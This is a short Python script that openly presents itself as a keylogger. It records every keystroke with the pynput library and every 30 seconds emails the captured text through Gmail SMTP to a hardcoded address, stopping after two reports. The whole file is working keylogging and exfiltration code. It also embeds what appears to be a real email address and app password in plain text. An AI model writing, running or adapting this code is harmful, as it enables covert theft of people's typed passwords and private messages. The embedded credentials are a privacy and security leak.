import smtplib
from email.mime.text import MIMEText
import ssl
from pynput import keyboard
import threading
import time 
import sys

# Configuration
EMAIL_ADDRESS = "ahadshaikh1504@gmail.com"
EMAIL_PASSWORD = "xkmz cshj ogsp kskv"  # App password
INTERVAL = 30  # seconds

keystrokes = []  
report_count = 0  # Counter to limit to 2 emails
MAX_REPORTS = 2  

# Function to handle key presses
def on_press(key):
    try:
        keystrokes.append(key.char)
    except AttributeError:
        keystrokes.append(f"[{key.name}]")

# Function to send email
def send_email(log):
    try:
        message = MIMEText(log)
        message["Subject"] = "Keylogger Log"
        message["From"] = EMAIL_ADDRESS
        message["To"] = EMAIL_ADDRESS

        context = ssl.create_default_context()
        with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context) as server:
            server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
            server.sendmail(EMAIL_ADDRESS, EMAIL_ADDRESS, message.as_string())
            print("Email sent successfully.")
    except Exception as e:
        print(f"Email sending failed: {e}")

# Periodic email sender
def report(listener): 
    global report_count
    if keystrokes and report_count < MAX_REPORTS:
        log = "".join(keystrokes)
        send_email(log)
        keystrokes.clear()
        report_count += 1
    if report_count < MAX_REPORTS:
        threading.Timer(INTERVAL, report,args=[listener]).start() 
    else:
        # Stop listener after sending reports
        listener.stop()
        print("Keylogger stopped after sending 2 reports.")
        sys.exit(0)
    # if keystrokes:
    #     log = "".join(keystrokes)
    #     send_email(log)
    #     keystrokes.clear()
    # threading.Timer(INTERVAL, report).start()

# Main
def main():
    print(f"Keylogger started. Sending logs every {INTERVAL} seconds.")
    listener = keyboard.Listener(on_press=on_press)
    listener.start()
    report(listener)
    listener.join()

if __name__ == "__main__":
    main()
